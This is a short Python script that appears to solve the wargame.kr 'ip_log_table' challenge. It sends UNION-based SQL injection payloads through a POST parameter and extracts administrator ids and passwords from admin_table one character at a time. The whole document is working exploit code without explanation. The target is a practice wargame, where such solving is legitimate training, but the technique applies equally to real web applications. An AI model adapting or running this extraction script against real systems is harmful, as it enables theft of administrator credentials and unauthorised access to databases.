from requests import *
s=session()
url='http://wargame.kr:8080/ip_log_table/chk.php'
leng=''
def id(name_length,table_num):
    result=''
    for i in range(1,name_length+1):
        data={'idx':f'1 union select ascii(substr(id,{i},1)) from admin_table limit {table_num},1'}
        response=post(url=url,data=data)
        value=response.text[31:36]
        if value[0:2]=='01':
            value=int(value[3:5])+60
        elif value[0:2]=='02':
            value=int(value[3:5])+120
        else:
            value=int(value[3:5])
        value=chr(value)
        result+=value
    print(result)

def pw(name_length,table_num):
    result=''
    for i in range(1,name_length+1):
        data={'idx':f'1 union select ascii(substr(ps,{i},1)) from admin_table limit {table_num},1'}
        response=post(url=url,data=data)
        value=response.text[31:36]
        if value[0:2]=='01':
            value=int(value[3:5])+60
        elif value[0:2]=='02':
            value=int(value[3:5])+120
        else:
            value=int(value[3:5])
        value=chr(value)
        result+=value
    print(result)

for i in range(0,30):
    data={'idx':f'1 union select length(id) from admin_table limit {i},1'}
    response=post(url=url,data=data)
    value=response.text[34:36]
    if value=='00':
        break
    id(int(value),i)

for i in range(0,30):
    data={'idx':f'1 union select length(ps) from admin_table limit {i},1'}
    response=post(url=url,data=data)
    value=response.text[34:36]
    if value=='00':
        break
    pw(int(value),i)